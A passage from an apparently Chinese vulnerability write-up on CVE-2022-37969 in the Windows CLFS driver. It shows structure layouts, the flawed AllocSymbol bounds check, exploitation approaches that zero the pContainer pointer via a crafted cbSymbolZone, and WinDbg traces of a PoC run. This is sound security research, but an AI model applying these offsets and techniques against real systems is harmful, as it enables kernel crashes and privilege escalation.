数组相对于基本块的偏移</p></li><li><p>cbSymbolZone</p><p>表示符号区中下一个可用的空闲偏移量，用于存储新符号。</p></li></ul><p>基本记录中，client context, container context, shared security context由symbols表示，在symbols前面是<code>CLFSHASHSYM</code>结构</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_NODE_ID {</span></span><span style="display:flex;"><span> ULONG cType;</span></span><span style="display:flex;"><span> ULONG cbNode;</span></span><span style="display:flex;"><span>} CLFS_NODE_ID,<span style="color:#f92672">*</span>PCLFS_NODE_ID;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFSHASHSYM</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> CLFS_NODE_ID cidNode;</span></span><span style="display:flex;"><span> ULONG ulHash;</span></span><span style="display:flex;"><span> ULONG cbHash;</span></span><span style="display:flex;"><span> ULONGLONG ulBelow;</span></span><span style="display:flex;"><span> ULONGLONG ulAbove;</span></span><span style="display:flex;"><span> LONG cbSymName;</span></span><span style="display:flex;"><span> LONG cbOffset;</span></span><span style="display:flex;"><span> BOOLEAN fDeleted;</span></span><span style="display:flex;"><span>} CLFSHASHSYM,<span style="color:#f92672">*</span>PCLFSHASHSYM;</span></span></code></pre></div><p>内存布局</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/3.png"/></p><p>在基本记录中，client context标示一个日志文件的client。client context结构如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_NODE_ID {</span></span><span style="display:flex;"><span> ULONG cType;</span></span><span style="display:flex;"><span> ULONG cbNode;</span></span><span style="display:flex;"><span>} CLFS_NODE_ID,<span style="color:#f92672">*</span>PCLFS_NODE_ID;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_CLIENT_CONTEXT</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> CLFS_NODE_ID cidNode;</span></span><span style="display:flex;"><span> CLFS_CLIENT_ID cidClient;</span></span><span style="display:flex;"><span> USHORT fAttributes;</span></span><span style="display:flex;"><span> ULONG cbFlushThreshold;</span></span><span style="display:flex;"><span> ULONG cShadowSectors;</span></span><span style="display:flex;"><span> ULONGLONG cbUndoCommitment;</span></span><span style="display:flex;"><span> LARGE_INTEGER llCreateTime;</span></span><span style="display:flex;"><span> LARGE_INTEGER llAccessTime;</span></span><span style="display:flex;"><span> LARGE_INTEGER llWriteTime;</span></span><span style="display:flex;"><span> CLFS_LSN lsnOwnerPage;</span></span><span style="display:flex;"><span> CLFS_LSN lsnArchiveTail;</span></span><span style="display:flex;"><span> CLFS_LSN lsnBase;</span></span><span style="display:flex;"><span> CLFS_LSN lsnLast;</span></span><span style="display:flex;"><span> CLFS_LSN lsnRestart;</span></span><span style="display:flex;"><span> CLFS_LSN lsnPhysicalBase;</span></span><span style="display:flex;"><span> CLFS_LSN lsnUnused1;</span></span><span style="display:flex;"><span> CLFS_LSN lsnUnused2;</span></span><span style="display:flex;"><span> CLFS_LOG_STATE eState;<span style="color:#75715e">//+0x78</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">union</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> HANDLE hSecurityContext;</span></span><span style="display:flex;"><span> ULONGLONG ullAlignment;</span></span><span style="display:flex;"><span> };</span></span><span style="display:flex;"><span>} CLFS_CLIENT_CONTEXT,<span style="color:#f92672">*</span>PCLFS_CLIENT_CONTEXT;</span></span></code></pre></div><p>container context结构和日志文件添加容器有关，container context结构</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> CLFS_NODE_ID cidNode;<span style="color:#75715e">//8 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONGLONG cbContainer;<span style="color:#75715e">//8 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_CONTAINER_ID cidContainer;<span style="color:#75715e">// 4 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_CONTAINER_ID cidQueue;<span style="color:#75715e">// 4 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">union</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> CClfsContainer<span style="color:#f92672">*</span> pContainer;<span style="color:#75715e">//8 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONGLONG ullAlignment;</span></span><span style="display:flex;"><span> };</span></span><span style="display:flex;"><span> CLFS_USN usnCurrent;</span></span><span style="display:flex;"><span> CLFS_CONTAINER_STATE eState;</span></span><span style="display:flex;"><span> ULONG cbPrevOffset;<span style="color:#75715e">//4 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONG cbNextOffset;<span style="color:#75715e">//4 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>} CLFS_CONTAINER_CONTEXT,<span style="color:#f92672">*</span>PCLFS_CONTAINER_CONTEXT;</span></span></code></pre></div><p>内存布局</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/4.png"/></p><p>其中pContainer是指向CClfsContainer对象的指针</p><p><strong>漏洞点</strong></p><p>该处获取通过<code>GetBaseLogRecord</code>函数获取<code>BaseLogRecord</code>，之后的<code>cbSymbolZone</code>，判断cbSymbolZone+v4是否大于SignaturesOffset的，如果判断通过则通过memset将BaseLogRecord+cbSymbolZone内存清零，大小为v4。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">AllocSymbol</span>(CClfsBaseFilePersisted<span style="color:#f92672">*</span>this,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,<span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> v4;<span style="color:#75715e">// rbp</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>BaseLogRecord;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v6;<span style="color:#75715e">// r8 this指针</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>v7;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_LOG_BLOCK_HEADER<span style="color:#f92672">*</span>v8;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> cbSymbolZone;<span style="color:#75715e">// r8</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>v10;<span style="color:#75715e">// rbx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> result;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> BaseLogRecord<span style="color:#f92672">=</span> (CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>)CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>(this);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> BaseLogRecord;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>BaseLogRecord )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929421</span>i64;</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(CLFS_LOG_BLOCK_HEADER<span style="color:#f92672">**</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>i64);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a3<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> cbSymbolZone<span style="color:#f92672">=</span> BaseLogRecord<span style="color:#f92672">-></span>cbSymbolZone;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>BaseLogRecord[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span> cbSymbolZone<span style="color:#f92672">+</span> v4<span style="color:#f92672">></span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>v8<span style="color:#f92672">+</span> v8<span style="color:#f92672">-></span>SignaturesOffset) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3221225507</span>i64;</span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b000 15 00 03 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=.........</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p.......</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b060 00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00 .........y......</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b070 05 00 00 00 00 00 00 00-aa fb b6 33 fa f9 ed 11 ...........3....</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v10<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>BaseLogRecord[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span> cbSymbolZone;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(v10,<span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v4);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">-></span>cbSymbolZone<span style="color:#f92672">+=</span> v4;</span></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a3<span style="color:#f92672">=</span> v10;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h3 id="影响版本">影响版本</h3><p>略</p><h3 id="环境搭建">环境搭建</h3><ul><li>Windows 10 21H2</li><li>windbg</li></ul><h3 id="技术分析调试">技术分析&amp;调试</h3><p>基于该漏洞点有两种利用方式，第一种将<code>cbSymbolZone</code>修改为自身的<code>CLFS_CONTAINER_CONTEXT->pContainer</code>结构偏移，由于<code>CLFS_CONTAINER_CONTEXT</code>内存有<code>Container context</code>对象指针。使用<code>memset</code>清空该指针，当解引用该指针将触发异常，导致蓝屏。</p><p>第二种将<code>cbSymbolZone</code> 修改为下个BLF文件的<code>CLFS_CONTAINER_CONTEXT->pContainer</code>结构偏移，利用漏洞将该指针清零，解引用第二个BLF文件的<code>CLFS_CONTAINER_CONTEXT->pContainer</code> 将导致蓝屏，这种方式利用需要绕过<code>(char *)&amp;BaseLogRecord[1] + cbSymbolZone + v4 > (char *)(&amp;v8+ v8->SignaturesOffset)</code></p><p><strong>第一种利用方式</strong></p><p>在调试中发现<code>CLFS_CONTAINER_CONTEXT</code>结构距离<code>CLFS_BASE_RECORD_HEADER</code>结束为0x128，<code>pContainer</code>指针距离<code>CLFS_BASE_RECORD_HEADER</code>为0x130，此处要清空高四位（内核解引用指针会校验指针是否为NULL，所以不能把所有的位都清零），则应设为144。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffff970a4995c4d0</span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c4d0<span style="color:#ae81ff">00000030</span><span style="color:#960050;background-color:#1e0010">`</span>c1fdf008<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">80000</span></span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c4e0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">45f</span><span style="color:#ae81ff">7</span>cd40</span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c4f0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c500<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c510<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c520<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c530<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c540<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> rr8</span></span><span style="display:flex;"><span>r8<span style="color:#f92672">=</span><span style="color:#ae81ff">000000000000000</span>c</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> rrdi</span></span><span style="display:flex;"><span>rdi<span style="color:#f92672">=</span>ffff970a4995b070</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">?</span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c4d0<span style="color:#f92672">-</span>ffff970a4995b070</span></span><span style="display:flex;"><span>Evaluate expression:<span style="color:#ae81ff">5216</span><span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00001460</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">?</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00001460</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x1338</span></span></span><span style="display:flex;"><span>Evaluate expression:<span style="color:#ae81ff">296</span><span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000012</span><span style="color:#ae81ff">8</span></span></span></code></pre></div><p>在<code>clfs!CClfsBaseFilePersisted::AllocSymbol</code>下断点，运行PoC</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>bp clfs<span style="color:#f92672">!</span>CClfsBaseFilePersisted::AllocSymbol</span></span></code></pre></div><p><code>CLFS!CClfsBaseFilePersisted::AllocSymbol</code>通过调用<code>CLFS!CClfsBaseFile::GetBaseLogRecord</code>获取到了基本记录头，可以看到<code>_CLFS_BASE_RECORD_HEADER→cbSymbolZone</code>已被设为144</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>1: kd<span style="color:#f92672">></span> db rax</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f383070 05 00 00 00 00 00 00 00<span style="color:#f92672">-</span>a1 a9 21 b4 31 0f ee 11 ..........<span style="color:#f92672">!</span>.<span style="color:#a6e22e">1</span>...</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f383080 bc 69 00 0c 29 07 fc 32<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 .<span style="color:#a6e22e">i</span>..)..<span style="color:#a6e22e">2</span>........</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f383090 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3830a0 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3830b0 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3830c0 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>38 13 00 00 00 00 00 00 ........<span style="color:#a6e22e">8</span>.......</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3830d0 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3830e0 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>1: kd<span style="color:#f92672">></span> db rax<span style="color:#f92672">+</span> 0x1328</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384398 44 01 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 03 01 01 00 00 00 D...............</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3843a8 06 f0 fd c1 30 00 00 00<span style="color:#f92672">-</span>16 00 d2 02 b8 00 00 00 ....<span style="color:#a6e22e">0</span>...........</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3843b8 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3843c8 f0 13 00 00 68 13 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ....<span style="color:#a6e22e">h</span>...........</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3843d8 07 f0 fd c1 88 00 00 00<span style="color:#f92672">-</span>00 00 00 01 40 9c 00 00 ............<span style="color:#960050;background-color:#1e0010">@</span>...</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3843e8 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3843f8 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384408 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 ff ff ff ff ................</span></span></code></pre></div><p>而后对<code>BaseLogRecord+0x1338+cbSymbolZone</code>处大小为v4的内存调用memset清零</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>v4<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> BaseLogRecord<span style="color:#f92672">=</span> (CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>)CClfsBaseFile::GetBaseLogRecord(<span style="color:#66d9ef">this</span>);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> BaseLogRecord;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>BaseLogRecord )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> 3222929421i64;</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(CLFS_LOG_BLOCK_HEADER<span style="color:#f92672">**</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span> 48)<span style="color:#f92672">+</span> 48i64);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a3<span style="color:#f92672">=</span> 0i64;</span></span><span style="display:flex;"><span> cbSymbolZone<span style="color:#f92672">=</span> BaseLogRecord<span style="color:#f92672">-></span>cbSymbolZone;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>BaseLogRecord<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span><span style="color:#f92672">+</span> cbSymbolZone<span style="color:#f92672">+</span> v4<span style="color:#f92672">></span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>v8<span style="color:#f92672">-></span>MajorVersion<span style="color:#f92672">+</span> v8<span style="color:#f92672">-></span>SignaturesOffset) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> 3221225507i64;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>BaseLogRecord<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span><span style="color:#f92672">+</span> cbSymbolZone;</span></span><span style="display:flex;"><span> memset(v10, 0, (unsigned<span style="color:#66d9ef">int</span>)v4);</span></span></code></pre></div><p>在调试器中可以看到rcx指向了<code>CLFS_CONTAINER_CONTEXT->pContainer</code> 的高四位。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>1: kd<span style="color:#f92672">></span> dd rcx<span style="color:#f92672">-</span> 0x1c</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844d0 c1fdf008 00000030 00080000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844e0 00000000 00000000 4bd8b7c0 ffffbd84</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844f0 00000001 00000002 00000000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384500 003f005c 005c003f 003a0043 0055005c</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384510 00650073 00730072 0050005c 00620075</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384520 0069006c 005c0063 0063002e 006e006f</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384530 00610074 006e0069 00720065 0031005f</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384540 00310034 00000000 00000000 00000000</span></span><span style="display:flex;"><span>1: kd<span style="color:#f92672">></span> u</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted::AllocSymbol<span style="color:#f92672">+</span>0x67:</span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d0207 e874c8fcff call CLFS<span style="color:#f92672">!</span>memset (fffff801<span style="color:#960050;background-color:#1e0010">`</span>2709ca80)</span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d020c 01af28130000 add dword ptr<span style="color:#f92672">[</span>rdi<span style="color:#f92672">+</span>1328h<span style="color:#f92672">]</span>,ebp</span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d0212 33c0 xor eax,eax</span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d0214 48891e mov qword ptr<span style="color:#f92672">[</span>rsi<span style="color:#f92672">]</span>,rbx</span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d0217 488b5c2430 mov rbx,qword ptr<span style="color:#f92672">[</span>rsp<span style="color:#f92672">+</span>30h<span style="color:#f92672">]</span></span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d021c 488b6c2438 mov rbp,qword ptr<span style="color:#f92672">[</span>rsp<span style="color:#f92672">+</span>38h<span style="color:#f92672">]</span></span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d0221 488b742440 mov rsi,qword ptr<span style="color:#f92672">[</span>rsp<span style="color:#f92672">+</span>40h<span style="color:#f92672">]</span></span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d0226 4883c420 add rsp,20h</span></span></code></pre></div><p>继续运行，memset已经将该指针的高四位清零</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>1: kd<span style="color:#f92672">></span> p</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted::AllocSymbol<span style="color:#f92672">+</span>0x6c:</span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d020c 01af28130000 add dword ptr<span style="color:#f92672">[</span>rdi<span style="color:#f92672">+</span>1328h<span style="color:#f92672">]</span>,ebp</span></span><span style="display:flex;"><span>1: kd<span style="color:#f92672">></span> dd ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844d0</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844d0 c1fdf008 00000030 00080000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span 